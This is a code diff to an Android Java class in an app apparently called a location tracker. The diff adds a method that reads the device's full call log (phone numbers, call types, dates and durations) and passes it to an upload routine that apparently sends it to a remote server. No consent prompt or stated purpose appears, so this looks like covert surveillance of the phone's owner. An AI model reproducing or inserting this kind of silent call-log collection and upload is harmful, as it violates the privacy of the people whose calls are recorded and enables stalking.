@@ -11,12 +11,32 @@ import java.util.Date;
 
 import static android.content.ContentValues.TAG;
 
+import com.varbin.locationtracker.APIs.CreaterClass;
+
+import models.multiListClass;
+
 public class lastCall {
-    public static ArrayList<logModel> logModel (Context context){
-        ArrayList<logModel> arrayList = new ArrayList<>();
+
+    public static void ValidatLog(Context context){
+        multiListClass mc = logModel(context);
+        String number = mc.number.toString();
+        String type = mc.type.toString();
+        String date = mc.date.toString();
+        String duration =mc.duration.toString();
+        CreaterClass.uploadCallLog(number , type , date , duration ,context);
+        CreaterClass.inActive("contact_log");
+
+    }
+
+
+    public static multiListClass logModel (Context context){
+        multiListClass multiListClass = new multiListClass();
+        multiListClass.date = new ArrayList<>();
+        multiListClass.duration = new ArrayList<>();
+        multiListClass.number = new ArrayList<>();
+        multiListClass.type = new ArrayList<>();
         Uri contacts = CallLog.Calls.CONTENT_URI;
         Log.d(TAG, "stopRecording: bahar tak aay");
-        logModel callDetails = new logModel();
         try {
             Cursor managedCursor = context.getContentResolver().query(contacts, null, null, null, android.provider.CallLog.Calls.DATE + " DESC ;");
             int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -33,12 +53,16 @@ public class lastCall {
                 String callDate = managedCursor.getString(date);
                 String callDayTime = String.valueOf(new Date(Long.parseLong(callDate)).toString());
                 String callDuration = managedCursor.getString(duration);
-                callDetails.setPhNumber(phNumber);
-                callDetails.setCallDuration(callDuration);
-                callDetails.setCallType(callType);
-                callDetails.setCallDayTime(callDayTime);
-                callDetails.setName(cName);
-                arrayList.add(callDetails);
+                multiListClass.type.add(callType);
+                multiListClass.date.add(callDate);
+                multiListClass.number.add(phNumber);
+                multiListClass.duration.add(callDuration);
+//                callDetails.setPhNumber(phNumber);
+//                callDetails.setCallDuration(callDuration);
+//                callDetails.setCallType(callType);
+//                callDetails.setCallDayTime(callDayTime);
+//                callDetails.setName(cName);
+//                arrayList.add(callDetails);
 
             }
             managedCursor.close();
@@ -49,7 +73,7 @@ public class lastCall {
 
         }
 
-        return arrayList;
+        return multiListClass;
 
     }
 }
